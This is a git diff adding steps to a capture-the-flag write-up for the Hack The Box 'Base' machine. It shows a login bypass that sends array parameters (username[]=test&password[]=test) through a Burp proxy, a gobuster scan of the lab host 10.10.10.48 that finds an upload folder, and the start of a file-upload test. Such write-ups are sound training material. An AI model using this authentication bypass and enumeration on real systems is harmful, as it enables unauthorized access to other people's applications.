@@ -70,11 +70,33 @@
 
 // Now lets send another login but this time we will edit the request in BurpSuite proxy
 
+// edit to last line and send
+
+    username[]=test&password[]=test
 
 ![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Base/4.png)
 
 
-//
+// We got redirect to http://10.10.10.48/upload.php , where we can upload files
+
+
+![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Base/5.png)
+
+
+// when upload file its send us succcess but where the file?... lets run gobuster
+
+    $ gobuster dir -u http://10.10.10.48/ -w /usr/share/wordlists/dirb/big.txt -q -n -e
+-----    
+    
+    http://10.10.10.48/.htaccess            [Size: 276]
+    http://10.10.10.48/.htpasswd            [Size: 276]
+    http://10.10.10.48/_uploaded            [Size: 314] [--> http://10.10.10.48/_uploaded/]
+
+
+// lets test if and upload some file and call him
+
+    $ touch 1 > test.txt
+
 
 
 
